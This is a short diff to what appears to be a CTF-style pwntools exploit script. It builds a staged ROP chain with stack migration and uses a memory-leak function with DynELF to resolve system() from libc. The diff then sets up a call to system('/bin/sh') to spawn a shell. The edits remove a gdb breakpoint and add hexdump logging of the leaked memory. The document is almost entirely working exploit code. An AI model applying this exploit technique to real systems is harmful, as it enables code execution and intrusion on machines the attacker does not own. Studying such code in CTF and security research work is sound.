@@ -39,10 +39,6 @@ rop = myrop()
 rop.read(0, cur_addr, 0x100)
 rop.migrate(cur_addr)
 log.info("Stage 1 Rop:\n%s" % (rop.dump()))
-gdb.attach(r, '''
-b *0x804841c
-''')
-pause()
 r.send(padding + str(rop))
 
 # Now we create a memleaker, so we can use DynELF
@@ -57,11 +53,13 @@ def leak(addr, length = 0x100):
     rop.migrate(cur_addr)
     r.send(str(rop))
 
-    return r.recvn(length)
+    data = r.recvn(length)
+    log.debug("Leaked %#x\n%s" % (addr, hexdump(data)))
+    return data
 
 # Use the memleaker to resolve system from libc
 resolver = DynELF(leak, elf=rex)
-system = resolver.lookup('system')
+system = resolver.lookup('system', 'libc')
 
 # Call system('/bin/sh')
 rop = myrop(cur_addr)
